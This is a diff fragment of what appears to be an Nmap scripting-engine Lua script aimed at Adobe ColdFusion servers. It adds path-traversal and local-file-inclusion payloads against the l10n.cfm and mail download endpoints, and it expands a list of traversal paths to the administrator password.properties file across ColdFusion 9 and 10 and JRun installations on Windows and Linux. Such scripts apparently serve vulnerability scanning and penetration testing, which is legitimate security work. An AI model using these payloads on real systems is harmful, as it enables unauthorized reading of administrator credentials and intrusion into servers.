@@ -23,7 +23,18 @@ portrule = shortport.http
 
 local PATH_PAYLOAD = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
 local IMG_PAYLOAD = "/CFIDE/administrator/images/loginbackground.jpg"
-local CREDENTIALS_PAYLOAD = {"../../lib/password.properties", '..\\..\\lib\\password.properties', '..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties'}
+local LFI_PAYLOAD_FRAG_1 = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
+local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
+local CREDENTIALS_PAYLOAD = {"../../lib/password.properties",
+                             '..\\..\\lib\\password.properties', 
+                             '..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\lib\\password.properties',
+                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion10\\cfusion\\lib\\password.properties", 
+                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties",
+                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\lib\\password.properties",
+                             "..\\..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion9\\cfusion\\lib\\password.properties",
+                             "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties",
+                             "../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties",
+                             "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties"}
 
 ---
 -- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
